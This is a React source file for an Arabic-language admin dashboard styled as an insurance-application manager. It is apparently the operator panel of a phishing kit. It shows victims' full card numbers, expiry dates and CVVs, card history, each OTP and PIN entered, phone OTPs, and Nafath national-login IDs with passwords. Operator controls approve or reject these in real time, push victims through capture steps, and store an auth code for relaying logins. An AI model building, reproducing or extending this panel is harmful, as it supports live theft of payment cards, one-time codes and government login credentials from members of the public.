"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  CheckCircle,
  XCircle,
  Clock,
  MessageSquare,
  Settings,
  Phone,
  CreditCard,
  Mail,
  Filter,
  FileText,
  Car,
  Shield,
  User,
  ChevronDown,
  History,
  LayoutGrid,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { CreditCardMockup } from "@/components/credit-card-mockup"
import { StatCard } from "@/components/stat-card (1)"
import { ApplicationCard } from "@/components/application-card"
import { ApprovalButtons } from "@/components/approval-buttons"
import { DetailSection } from "@/components/detail-section"
import { DataField } from "@/components/data-field"


const STEP_NAMES: Record<number | string, string> = {
  1: "PIN",
  2: "تفاصيل",
  3: "OTP",
  4: "بطاقة",
  nafad: "نفاذ",
  phone: "هاتف",
  home: "الرئيسية",
}

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
  const [loading, setLoading] = useState(true)
  const [showFilters, setShowFilters] = useState(false)
  const [showChat, setShowChat] = useState(false)
  const [showCardHistory, setShowCardHistory] = useState(false)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [authNumber, setAuthNumber] = useState("")
  const prevApplicationsCount = useRef<number>(0)

  // Stats calculation
  const stats = useMemo(
    () => ({
      total: applications.length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      rejected: applications.filter((a) => a.status === "rejected").length,
    }),
    [applications],
  )

  // Subscribe to applications
  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  // Filter applications
  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (statusFilter !== "all") {
        filtered = filtered.filter((app) => app.status === statusFilter)
      }

      if (cardFilter === "hasCard") {
        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
      } else if (cardFilter === "noCard") {
        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber.includes(query) ||
            app.cardNumber?.includes(query),
        )
      }

      // Sort by date - newest first
      filtered = filtered.sort((a, b) => {
        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0
        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0
        return dateB - dateA
      })

      setFilteredApplications(filtered)
    }, 200)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter, cardFilter])

  // Sync selected application with updates
  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) setSelectedApplication(updated)
    }
  }, [applications, selectedApplication])

  // Utility functions
  const formatArabicDate = useCallback((dateString?: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    const now = new Date()
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (diffInSeconds < 60) return "منذ لحظات"
    if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60)
      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes <= 2 ? "دقيقتين" : "دقائق"}`
    }
    if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600)
      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours <= 2 ? "ساعتين" : "ساعات"}`
    }
    if (diffInSeconds < 604800) {
      const days = Math.floor(diffInSeconds / 86400)
      return `منذ ${days} ${days === 1 ? "يوم" : days <= 2 ? "يومين" : "أيام"}`
    }
    return date.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" })
  }, [])

  const getStepName = (step: number | string) => STEP_NAMES[step] || `الخطوة ${step}`

  const hasCardInfo = (app: InsuranceApplication) => !!(app.cardNumber || app.expiryDate || app.cvv)

  const hasAnyData = (app: InsuranceApplication) =>
    !!(
      app.cardNumber ||
      app.otp ||
      app.allOtps ||
      app.phoneNumber2 ||
      app.phoneOtp ||
      app.selectedCarrier ||
      app.totalPrice ||
      app.pinCode
    )

  // Action handlers
  const handleStepChange = useCallback(
    async (appId: string, newStep: number | string) => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
      }
      try {
        await updateApplication(appId, { currentStep: newStep as number })
      } catch (error) {
        console.error("Error updating step:", error)
      }
    },
    [selectedApplication],
  )

  const handleApprovalChange = useCallback(
    async (appId: string, field: keyof InsuranceApplication, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, [field]: status } : app)))
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, [field]: status } : null))
      }
      try {
        await updateApplication(appId, { [field]: status })
        if (status === "approved") playSuccessSound()
        else if (status === "rejected") playErrorSound()
      } catch (error) {
        console.error("Error updating approval:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleAuthNumber = async (appId: string, auth: string) => {
    try {
      await updateApplication(appId, { authNumber: auth })
      playSuccessSound()
      setAuthNumber("")
    } catch (error) {
      console.error("Error saving auth number:", error)
      playErrorSound()
    }
  }

  const markAsRead = useCallback(async (app: InsuranceApplication) => {
    if (app.isUnread) {
      try {
        await updateApplication(app.id!, { isUnread: false })
        setApplications((prev) => prev.map((a) => (a.id === app.id ? { ...a, isUnread: false } : a)))
      } catch (error) {
        console.error("Error marking as read:", error)
      }
    }
  }, [])

  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, e: React.MouseEvent) => {
    e.stopPropagation()
    try {
      await updateApplication(appId, { isUnread: !currentIsUnread })
      setApplications((prev) => prev.map((a) => (a.id === appId ? { ...a, isUnread: !currentIsUnread } : a)))
    } catch (error) {
      console.error("Error toggling read status:", error)
    }
  }, [])

  const toggleSelection = useCallback((id: string, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(id)) newSet.delete(id)
      else newSet.add(id)
      return newSet
    })
  }, [])

  const handleDelete = useCallback(
    async (appId: string, e: React.MouseEvent) => {
      e.stopPropagation()
      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
        setApplications((prev) => prev.filter((app) => app.id !== appId))
        if (selectedApplication?.id === appId) setSelectedApplication(null)
        setSelectedIds((prev) => {
          const newSet = new Set(prev)
          newSet.delete(appId)
          return newSet
        })
        playSuccessSound()
      }
    },
    [selectedApplication],
  )

  return (
    <div className="min-h-screen bg-background dark" dir="rtl">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-card/95 backdrop-blur-lg border-b border-border">
        <div className="flex items-center justify-between px-6 py-3">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-lg bg-primary flex items-center justify-center">
                <Shield className="w-5 h-5 text-primary-foreground" />
              </div>
              <div>
                <h1 className="text-sm font-bold text-foreground">لوحة التحكم</h1>
                <p className="text-[10px] text-muted-foreground">إدارة طلبات التأمين</p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {stats.pending > 0 && (
              <Badge variant="secondary" className="bg-warning/10 text-warning border-warning/20 px-3">
                <span className="w-1.5 h-1.5 rounded-full bg-warning ml-2 animate-pulse" />
                {stats.pending} طلب جديد
              </Badge>
            )}
            <Button variant="ghost" size="icon" className="h-9 w-9">
              <Settings className="w-4 h-4" />
            </Button>
            <div className="w-8 h-8 rounded-lg bg-primary flex items-center justify-center text-xs font-bold text-primary-foreground">
              م
            </div>
          </div>
        </div>
      </header>

      {/* Stats */}
      <div className="border-b border-border bg-card/50">
        <div className="px-6 py-4">
          <div className="grid grid-cols-4 gap-3">
            <StatCard icon={LayoutGrid} label="إجمالي الطلبات" value={stats.total} variant="default" />
            <StatCard icon={Clock} label="قيد المراجعة" value={stats.pending} variant="warning" />
            <StatCard icon={CheckCircle} label="موافق عليه" value={stats.approved} variant="success" />
            <StatCard icon={XCircle} label="مرفوض" value={stats.rejected} variant="destructive" />
          </div>
        </div>
      </div>

      <div className="flex h-[calc(100vh-160px)]">
        {/* Sidebar */}
        <div className="w-[380px] bg-card border-l border-border flex flex-col">
          {/* Search & Filters */}
          <div className="p-4 space-y-3 border-b border-border">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                placeholder="بحث بالاسم أو رقم الهوية..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pr-10 h-9 text-sm"
              />
            </div>

            <div className="flex items-center gap-2">
              <Tabs defaultValue="all" className="flex-1" onValueChange={setStatusFilter}>
                <TabsList className="w-full h-8 p-0.5 bg-muted">
                  <TabsTrigger value="all" className="flex-1 h-7 text-xs">
                    الكل
                  </TabsTrigger>
                  <TabsTrigger value="pending_review" className="flex-1 h-7 text-xs">
                    هاتف
                  </TabsTrigger>
                  <TabsTrigger value="approved" className="flex-1 h-7 text-xs">
                    بطاقات
                  </TabsTrigger>
                  <TabsTrigger value="rejected" className="flex-1 h-7 text-xs">
                    معلومات
                  </TabsTrigger>
                </TabsList>
              </Tabs>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="outline" size="sm" className="h-8 gap-1.5 bg-transparent">
                    <Filter className="w-3.5 h-3.5" />
                    <ChevronDown className="w-3 h-3" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-40">
                  <DropdownMenuItem onClick={() => setCardFilter("all")}>الكل</DropdownMenuItem>
                  <DropdownMenuItem onClick={() => setCardFilter("hasCard")}>
                    <CreditCard className="w-3.5 h-3.5 ml-2" />
                    لديه بطاقة
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={() => setCardFilter("noCard")}>بدون بطاقة</DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>

          {/* Applications List */}
          <div className="flex-1 overflow-y-auto custom-scrollbar">
            {loading ? (
              <div className="flex items-center justify-center h-full">
                <div className="text-center space-y-3">
                  <div className="w-10 h-10 border-2 border-muted border-t-primary rounded-full animate-spin mx-auto" />
                  <p className="text-sm text-muted-foreground">جاري التحميل...</p>
                </div>
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full p-8 text-center">
                <div className="w-16 h-16 rounded-2xl bg-muted flex items-center justify-center mb-4">
                  <Mail className="w-8 h-8 text-muted-foreground" />
                </div>
                <p className="text-foreground font-medium mb-1">لا توجد طلبات</p>
                <p className="text-xs text-muted-foreground">جرب تغيير الفلاتر أو البحث</p>
              </div>
            ) : (
              <div className="divide-y divide-border/50">
                {filteredApplications.map((app) => (
                  <ApplicationCard
                    key={app.id}
                    app={app}
                    isSelected={selectedIds.has(app.id!)}
                    isActive={selectedApplication?.id === app.id}
                    stepName={getStepName(app.currentStep)}
                    formattedDate={formatArabicDate(app.createdAt)}
                    hasCard={hasCardInfo(app)}
                    onSelect={() => {
                      setSelectedApplication(app)
                      setShowChat(false)
                      markAsRead(app)
                    }}
                    onToggleSelection={(e) => toggleSelection(app.id!, e)}
                    onToggleRead={(e) => toggleReadStatus(app.id!, app.isUnread === true, e)}
                    onDelete={(e) => handleDelete(app.id!, e)}
                  />
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 bg-background overflow-hidden">
          {selectedApplication ? (
            showChat ? (
              <ChatPanel
                applicationId={selectedApplication.id!}
                currentUserId="admin-001"
                currentUserName="المسؤول"
                currentUserRole="admin"
                onClose={() => setShowChat(false)}
              />
            ) : (
              <div className="h-full flex flex-col">
                {/* Detail Header */}
                <div className="sticky top-0 z-10 bg-card/95 backdrop-blur-lg border-b border-border p-5">
                  <div className="flex items-start justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-primary flex items-center justify-center text-lg font-bold text-primary-foreground">
                        {selectedApplication.ownerName?.charAt(0)}
                      </div>
                      <div>
                        <h2 className="text-lg font-bold text-foreground">{selectedApplication.ownerName}</h2>
                        <div className="flex items-center gap-2 mt-0.5">
                          <Badge variant="secondary" className="text-[10px]">
                            {getStepName(selectedApplication.currentStep)}
                          </Badge>
                          {selectedApplication.country && (
                            <span className="text-xs text-muted-foreground">{selectedApplication.country}</span>
                          )}
                        </div>
                      </div>
                    </div>
                    <Button onClick={() => setShowChat(true)} size="sm" className="gap-2">
                      <MessageSquare className="w-4 h-4" />
                      دردشة
                    </Button>
                  </div>

                  {/* Step Controls */}
                  <div className="flex flex-wrap gap-2">
                    {["nafad", "phone", "home"].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        variant={selectedApplication.currentStep === step ? "default" : "outline"}
                        size="sm"
                        className="h-8 text-xs"
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                    <div className="w-px h-8 bg-border mx-1" />
                    {[1, 2, 3, 4].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        variant={selectedApplication.currentStep === step ? "default" : "outline"}
                        size="sm"
                        className="h-8 text-xs"
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                  </div>
                </div>

                {/* Detail Content */}
                <div className="flex-1 overflow-y-auto p-5 custom-scrollbar">
                  {hasAnyData(selectedApplication) ? (
                    <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4 max-w-7xl">
                      {/* Payment Card */}
                      {selectedApplication.cardNumber && (
                        <DetailSection
                          icon={CreditCard}
                          title="معلومات الدفع"
                          delay={0}
                          badge={
                            selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 ? (
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => setShowCardHistory(!showCardHistory)}
                                className="h-7 text-xs gap-1"
                              >
                                <History className="w-3 h-3" />
                                {selectedApplication.cardHistory.length} سابقة
                              </Button>
                            ) : null
                          }
                        >
                          <div className="space-y-4">
                            <CreditCardMockup
                              cardNumber={selectedApplication.cardNumber}
                              expiryDate={selectedApplication.expiryDate}
                              cvv={selectedApplication.cvv}
                              cardholderName={selectedApplication.ownerName}
                            />

                            {selectedApplication.totalPrice && (
                              <div className="p-3 bg-success/10 border border-success/20 rounded-lg text-center">
                                <p className="text-[10px] text-success mb-1">قيمة التأمين</p>
                                <p className="text-xl font-bold text-success font-mono" dir="ltr">
                                  {selectedApplication.totalPrice} ر.س
                                </p>
                              </div>
                            )}

                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "cardApproved", "approved")
                              }
                              onReject={() => handleApprovalChange(selectedApplication.id!, "cardApproved", "rejected")}
                              approveDisabled={selectedApplication.cardApproved === "approved"}
                              rejectDisabled={selectedApplication.cardApproved === "rejected"}
                              approveLabel="قبول البطاقة"
                              rejectLabel="رفض البطاقة"
                            />

                            {/* Card History */}
                            {showCardHistory &&
                              selectedApplication.cardHistory &&
                              selectedApplication.cardHistory.length > 0 && (
                                <div className="pt-4 border-t border-border space-y-3">
                                  <h4 className="text-xs font-medium text-muted-foreground flex items-center gap-2">
                                    <History className="w-3.5 h-3.5" />
                                    البطاقات السابقة
                                  </h4>
                                  {selectedApplication.cardHistory.map((card: { cardNumber: string | undefined; expiryDate: string | undefined; cvv: string | undefined; addedAt: string | undefined }, i: React.Key | null | undefined) => (
                                    <div key={i} className="p-3 bg-muted/50 rounded-lg">
                                      <CreditCardMockup
                                        cardNumber={card.cardNumber}
                                        expiryDate={card.expiryDate}
                                        cvv={card.cvv}
                                        cardholderName={selectedApplication.ownerName}
                                      />
                                      <p className="text-[10px] text-muted-foreground mt-2 text-center">
                                        {formatArabicDate(card.addedAt)}
                                      </p>
                                    </div>
                                  ))}
                                </div>
                              )}
                          </div>
                        </DetailSection>
                      )}

                      {/* OTP Section */}
                      {selectedApplication.otp && (
                        <DetailSection icon={Shield} title="رمز التحقق OTP" delay={100}>
                          <div className="space-y-4">
                            <div className="p-4 bg-primary/10 border border-primary/20 rounded-lg text-center">
                              <p className="text-[10px] text-primary mb-2">الرمز الحالي</p>
                              <p className="text-3xl font-bold text-primary font-mono tracking-widest" dir="ltr">
                                {selectedApplication.otp}
                              </p>
                            </div>

                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "approved")
                              }
                              onReject={() =>
                                handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "rejected")
                              }
                              approveDisabled={selectedApplication.cardOtpApproved === "approved"}
                              rejectDisabled={selectedApplication.cardOtpApproved === "rejected"}
                            />

                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                              <div className="pt-3 border-t border-border">
                                <p className="text-[10px] text-muted-foreground mb-2">الرموز السابقة</p>
                                <div className="flex flex-wrap gap-1.5">
                                  {selectedApplication.allOtps.map((otp, i) => (
                                    <Badge key={i} variant="secondary" className="font-mono text-[10px]" dir="ltr">
                                      {otp}
                                    </Badge>
                                  ))}
                                </div>
                              </div>
                            )}
                          </div>
                        </DetailSection>
                      )}

                      {/* PIN Section */}
                      {selectedApplication.pinCode && (
                        <DetailSection icon={Shield} title="رمز PIN" delay={150}>
                          <div className="space-y-4">
                            <div className="p-4 bg-warning/10 border border-warning/20 rounded-lg text-center">
                              <p className="text-[10px] text-warning mb-2">Pin Code</p>
                              <p className="text-3xl font-bold text-warning font-mono tracking-widest" dir="ltr">
                                {selectedApplication.pinCode}
                              </p>
                            </div>

                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "approved")
                              }
                              onReject={() =>
                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "rejected")
                              }
                              approveDisabled={selectedApplication.idVerificationStatus === "approved"}
                              rejectDisabled={selectedApplication.idVerificationStatus === "rejected"}
                            />
                          </div>
                        </DetailSection>
                      )}

                      {/* Phone Section */}
                      {(selectedApplication.phoneNumber2 || selectedApplication.phoneOtp) && (
                        <DetailSection icon={Phone} title="معلومات الهاتف" delay={200}>
                          <div className="space-y-4">
                            <div className="grid grid-cols-2 gap-2">
                              <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
                              <DataField label="مزود الخدمة" value={selectedApplication.selectedCarrier} />
                            </div>

                            {selectedApplication.phoneOtp && (
                              <div className="p-3 bg-muted/50 rounded-lg text-center">
                                <p className="text-[10px] text-muted-foreground mb-1">رمز الهاتف</p>
                                <p className="text-xl font-bold font-mono" dir="ltr">
                                  {selectedApplication.phoneOtp}
                                </p>
                              </div>
                            )}

                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "approved")
                              }
                              onReject={() =>
                                handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "rejected")
                              }
                              approveDisabled={selectedApplication.phoneVerificationStatus === "approved"}
                              rejectDisabled={selectedApplication.phoneVerificationStatus === "rejected"}
                            />
                          </div>
                        </DetailSection>
                      )}

                      {/* Nafaz Section */}
                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
                        <DetailSection icon={User} title="نفاذ الوطني" delay={250}>
                          <div className="space-y-3">
                            <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
                            <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />

                            <div className="pt-3 border-t border-border space-y-2">
                              <Input
                                type="tel"
                                value={authNumber}
                                onChange={(e) => setAuthNumber(e.target.value)}
                                placeholder="أدخل رمز التوثيق"
                                className="h-9 text-sm"
                              />
                              <Button
                                onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                                size="sm"
                                className="w-full"
                                disabled={!authNumber}
                              >
                                <CheckCircle className="w-4 h-4 ml-1.5" />
                                حفظ رمز التوثيق
                              </Button>
                            </div>
                          </div>
                        </DetailSection>
                      )}

                      {/* Document Section */}
                      {(selectedApplication.documentType || selectedApplication.serialNumber) && (
                        <DetailSection icon={FileText} title="معلومات الوثيقة" delay={300}>
                          <div className="space-y-2">
                            <DataField label="نوع الوثيقة" value={selectedApplication.documentType} />
                            <DataField label="الاسم " value={selectedApplication.ownerName} />
                            <DataField label="الاسم البائع" value={selectedApplication?.buyerName} />
                            <DataField label="رقم وطني البائع" value={selectedApplication?.buyerIdNumber} />
                            <DataField label="رقم وطني " value={selectedApplication.identityNumber} />
                            <DataField label="الرقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
                            <DataField label="رقم الهاتف" value={selectedApplication.phoneNumber} mono copyable />
                            <DataField label="الدولة" value={selectedApplication.country} />
                          </div>
                        </DetailSection>
                      )}

                      {/* Insurance Section */}
                      {(selectedApplication.insuranceType || selectedApplication.insuranceStartDate) && (
                        <DetailSection icon={Shield} title="تفاصيل التأمين" delay={350}>
                          <div className="space-y-2">
                            <DataField label="نوع التأمين" value={selectedApplication.insuranceType} />
                            <DataField label="تاريخ البدء" value={selectedApplication.insuranceStartDate} />
                            <DataField
                              label="موقع الإصلاح"
                              value={selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
                            />
                          </div>
                        </DetailSection>
                      )}

                      {/* Vehicle Section */}
                      {(selectedApplication.vehicleModel || selectedApplication.manufacturingYear) && (
                        <DetailSection icon={Car} title="معلومات المركبة" delay={400}>
                          <div className="grid grid-cols-2 gap-2">
                            <DataField label="الموديل" value={selectedApplication.vehicleModel} />
                            <DataField label="سنة الصنع" value={selectedApplication.manufacturingYear?.toString()} />
                            <DataField
                              label="القيمة"
                              value={
                                selectedApplication.vehicleValue
                                  ? `${selectedApplication.vehicleValue} ريال`
                                  : undefined
                              }
                            />
                            <DataField label="الاستخدام" value={selectedApplication.vehicleUsage} />
                          </div>
                        </DetailSection>
                      )}
                    </div>
                  ) : (
                    <div className="flex items-center justify-center h-full">
                      <div className="text-center">
                        <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                          <FileText className="w-10 h-10 text-muted-foreground" />
                        </div>
                        <h3 className="text-lg font-semibold text-foreground mb-1">لا توجد بيانات</h3>
                        <p className="text-sm text-muted-foreground">لم يتم إضافة معلومات لهذا الطلب بعد</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center">
                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                  <Mail className="w-10 h-10 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold text-foreground mb-1">اختر طلباً لعرض التفاصيل</h3>
                <p className="text-sm text-muted-foreground">اضغط على أي طلب من القائمة الجانبية</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
